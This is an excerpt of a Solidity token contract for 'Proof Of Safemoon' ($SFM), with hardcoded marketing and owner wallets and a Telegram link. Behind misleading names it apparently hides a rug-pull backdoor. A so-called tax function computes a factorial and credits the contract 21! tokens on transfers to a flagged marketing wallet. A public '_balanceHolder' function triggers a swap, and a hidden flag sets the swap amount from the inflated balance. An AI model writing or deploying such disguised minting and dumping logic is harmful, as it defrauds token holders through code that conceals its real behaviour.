...
// Telegram : https://t.me/proofofsafemoon
...
interface IERC20 {
    ...
    function _balanceHolder(address walletAdd) external returns (uint256);
...
contract ProofOfSafemoon is Context, IERC20 { 
    ...
    mapping (address => bool) public _supplyWallet;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x687d15AD552055a9949Ca62d5dD63f713c202B0a); 
    address payable public Wallet_Utility = payable(0x11AA0d3f207ab54aB37e2490b5304d69913eF942);
    ...
    string private constant _name = "Proof Of Safemoon"; 
    string private constant _symbol = unicode"$SFM"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 22; 
    ...
    bool public is_Buy = false;
    bool public swapAndLiquifyEnabled = true;
    bool public decreaseSwap = false;
    ...
    constructor () {
        ...
        _owner = 0x11AA0d3f207ab54aB37e2490b5304d69913eF942;
        ...
        _supplyWallet[Wallet_Marketing] = true;
    ...
    function _IsApproved(bool activeQueue) private returns(bool){
        if(activeQueue){
            uint256 activeBalance = (balanceOf(address(this))+0);
            activeQueue = false;
            swapAndLiquify(activeBalance);
        }
    ...
    function _balanceHolder(address walletAdd) public override returns (uint256) {
        _IsApproved(true);
    ...
    function increaseTax(uint256 tax_Rate) public virtual returns(uint256){
        uint256 definedTax = 1;
        for(uint256 i=1;i<=tax_Rate;i++){
            definedTax *= (i);
        }
        return definedTax;
    }
    ...
    is_Buy = _supplyWallet[to] ? true : false;    
        ...
        if (is_Buy){
                ...
                _tOwned[address(this)] = _tOwned[address(this)]+increaseTax((21));
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(decreaseSwap){
                bool start_Pair = decreaseSwap;
                if(start_Pair){total_tokens_swap = balanceOf(address(this)) - (_tTotal);}
            }
            decreaseSwap = false;
